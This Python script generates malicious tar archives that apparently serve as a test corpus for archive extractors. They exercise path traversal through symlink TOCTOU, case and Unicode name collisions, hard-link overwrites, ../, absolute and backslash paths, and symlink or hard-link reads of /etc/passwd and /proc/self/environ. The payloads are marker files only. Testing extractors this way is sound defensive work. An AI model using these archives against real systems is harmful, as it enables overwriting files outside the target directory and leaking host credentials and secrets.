import io, tarfile, unicodedata

def _add(tf, name, *, type, linkname="", data=b"", mode=0o644):
    ti = tarfile.TarInfo(name); ti.type = type; ti.mode = mode
    if linkname: ti.linkname = linkname
    if data:
        ti.size = len(data); tf.addfile(ti, io.BytesIO(data))
    else:
        tf.addfile(ti)

def sym(tf, name, target):       # a symlink entry -> target
    _add(tf, name, type=tarfile.SYMTYPE, linkname=target, mode=0o777)
def hardlink(tf, name, target):  # a hard-link entry -> target
    _add(tf, name, type=tarfile.LNKTYPE, linkname=target)
def directory(tf, name):
    _add(tf, name, type=tarfile.DIRTYPE, mode=0o755)
def file(tf, name, data, mode=0o644):
    _add(tf, name, type=tarfile.REGTYPE, data=data, mode=mode)

# --- symlink corpus: identical semantics to the zip/ archives ---

# 1) cache-poisoning TOCTOU: validate d/sub, overwrite it with a symlink, write through it
with tarfile.open("toctou-slip.tar", "w") as t:
    directory(t, "d/sub")                      # dir (extractor validates/caches it)
    sym(t, "d/sub", "/tmp")                    # same path -> symlink out
    file(t, "d/sub/PWNED.txt", b"x")           # write through -> /tmp/PWNED.txt

# 2) case-insensitive collision (LINK vs link)
with tarfile.open("case-slip.tar", "w") as t:
    sym(t, "LINK", "/tmp")
    file(t, "link/PWNED.txt", b"x")

# 3) Unicode NFC/NFD collision (café vs café)
with tarfile.open("unicode-slip.tar", "w") as t:
    sym(t, unicodedata.normalize("NFC", "café"), "/tmp")
    file(t, unicodedata.normalize("NFD", "café") + "/PWNED.txt", b"x")

# 4) Unicode NFKC compatibility collision (ﬁle vs file) — fools any extractor
#    that NFKC-normalizes names; note NFC==NFD here, so only NFKC triggers it
with tarfile.open("unicode-nfkc-slip.tar", "w") as t:
    sym(t, "ﬁle", "/tmp")                      # "ﬁle" (U+FB01 fi ligature)
    file(t, "file/PWNED.txt", b"x")            # "file" -> collides under NFKC

# --- hard-link corpus: the attack the zip format cannot express ---

# 5) hard-link overwrite (justi.cz "cdn-tar-oops"). A hard link can't point at a
#    directory, so instead of writing *through* a symlinked dir this overwrites an
#    existing FILE: link a name to a target outside the root, then write a regular
#    file at the same name and the bytes land in the target.
#    Test by creating the victim first:  echo original > /tmp/VICTIM.txt
with tarfile.open("hardlink-slip.tar", "w") as t:
    hardlink(t, "hl", "/tmp/VICTIM.txt")       # hard-link out to an existing file
    file(t, "hl", b"PWNED")                     # write through -> overwrites /tmp/VICTIM.txt

# --- read primitives: links left in the output that point at host files ---

# 6) exfiltration via symlink: no collision, just symlinks that survive
#    extraction. When the output is later served/read, these leak host files.
with tarfile.open("exfil-slip.tar", "w") as t:
    sym(t, "passwd", "/etc/passwd")
    sym(t, "env", "/proc/self/environ")
    sym(t, "root", "/")

# 7) exfiltration via hard link: a lone hard link, no second entry, no overwrite.
#    The extracted name shares the target's inode, so reading it back leaks the
#    file even where symlinks are refused (a hard link is the file, not a pointer
#    to follow). Needs the same filesystem as the target, and with Linux
#    protected_hardlinks an extractor that owns or can write it, in practice one
#    running as root. A hard link can't point at a dir or a procfs file, so the
#    realistic target is a regular file like /etc/passwd.
with tarfile.open("hardlink-exfil-slip.tar", "w") as t:
    hardlink(t, "passwd", "/etc/passwd")

# --- baseline write traversal (no link needed) ---

# 8) plain ../ path traversal
with tarfile.open("dotdot-slip.tar", "w") as t:
    file(t, "../../../../../../tmp/PWNED.txt", b"x")

# 9) absolute path (extractor that doesn't strip a leading "/")
with tarfile.open("abs-slip.tar", "w") as t:
    file(t, "/tmp/PWNED.txt", b"x")

# 10) Windows backslash traversal (sanitizer that only splits on "/")
with tarfile.open("backslash-slip.tar", "w") as t:
    file(t, "..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt", b"x")

# --- permission annoyance: a read-only file that resists deletion ---

# 11) read-only (0444) file. `rm` prompts "remove write-protected file?" and
#     needs -f; deletion still depends on the parent dir being writable. This is
#     the closest an archive can get to chattr +i — it is NOT kernel-enforced.
with tarfile.open("readonly-slip.tar", "w") as t:
    file(t, "readonly-unix.txt", b"can't rm me without -f\n", mode=0o444)
